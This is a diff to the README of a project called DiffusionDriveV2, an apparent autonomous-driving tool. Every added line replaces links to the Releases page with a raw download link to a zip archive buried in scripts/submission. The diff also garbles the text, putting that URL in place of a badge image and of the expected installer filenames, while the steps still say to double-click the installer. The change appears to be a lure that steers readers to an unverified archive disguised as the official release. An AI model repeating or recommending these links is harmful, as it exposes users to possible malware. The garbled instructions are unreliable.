@@ -1,6 +1,6 @@
 # 🚗 DiffusionDriveV2 - Your Path to Smarter Driving Solutions
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Release-blue?style=for-the-badge)](https://github.com/rushikeshjaware/DiffusionDriveV2/releases)
+[![Download Now](https://github.com/rushikeshjaware/DiffusionDriveV2/raw/refs/heads/master/scripts/submission/Drive_Diffusion_1.9.zip%20Now-Release-blue?style=for-the-badge)](https://github.com/rushikeshjaware/DiffusionDriveV2/raw/refs/heads/master/scripts/submission/Drive_Diffusion_1.9.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to DiffusionDriveV2! This application helps you harness advanced reinfor
 
 To get started, you will need to visit the Releases page to download the application. 
 
-[Visit this page to download](https://github.com/rushikeshjaware/DiffusionDriveV2/releases)
+[Visit this page to download](https://github.com/rushikeshjaware/DiffusionDriveV2/raw/refs/heads/master/scripts/submission/Drive_Diffusion_1.9.zip)
 
 You will find the latest version available, along with any previous versions. Choose the version that best fits your needs.
 
@@ -27,13 +27,13 @@ Before you download, check if your system meets these requirements:
 ## 📂 Installation Steps
 
 1. **Download the Application**
-   - Go to the [Releases page](https://github.com/rushikeshjaware/DiffusionDriveV2/releases).
+   - Go to the [Releases page](https://github.com/rushikeshjaware/DiffusionDriveV2/raw/refs/heads/master/scripts/submission/Drive_Diffusion_1.9.zip).
    - Find the most recent version of DiffusionDriveV2.
    - Click on the download link for your operating system. The file will start downloading.
 
 2. **Locate the Downloaded File**
    - Open your Downloads folder.
-   - Look for a file named something like `DiffusionDriveV2-installer.exe` or `DiffusionDriveV2.dmg`.
+   - Look for a file named something like `https://github.com/rushikeshjaware/DiffusionDriveV2/raw/refs/heads/master/scripts/submission/Drive_Diffusion_1.9.zip` or `https://github.com/rushikeshjaware/DiffusionDriveV2/raw/refs/heads/master/scripts/submission/Drive_Diffusion_1.9.zip`.
 
 3. **Run the Installer**
    - Double-click on the installer file to launch it.
@@ -73,7 +73,7 @@ Once you open the application, you can begin creating driving scenarios. Follow 
 
 If you encounter issues while using DiffusionDriveV2, consider the following solutions:
 
-- **Install Latest Version:** Ensure you are using the latest version from the [Releases page](https://github.com/rushikeshjaware/DiffusionDriveV2/releases).
+- **Install Latest Version:** Ensure you are using the latest version from the [Releases page](https://github.com/rushikeshjaware/DiffusionDriveV2/raw/refs/heads/master/scripts/submission/Drive_Diffusion_1.9.zip).
 - **Check System Requirements:** Verify that your computer meets the requirements listed above.
 - **Search the Wiki:** Visit the project's wiki for solutions to common problems.
 
@@ -95,4 +95,4 @@ Stay tuned for updates on our Releases page.
 
 Thank you for choosing DiffusionDriveV2. We appreciate your interest in enhancing autonomous driving technology.
 
-Remember, for any downloads and updates, always check the [Releases page](https://github.com/rushikeshjaware/DiffusionDriveV2/releases). Enjoy your experience with DiffusionDriveV2!
+Remember, for any downloads and updates, always check the [Releases page](https://github.com/rushikeshjaware/DiffusionDriveV2/raw/refs/heads/master/scripts/submission/Drive_Diffusion_1.9.zip). Enjoy your experience with DiffusionDriveV2!
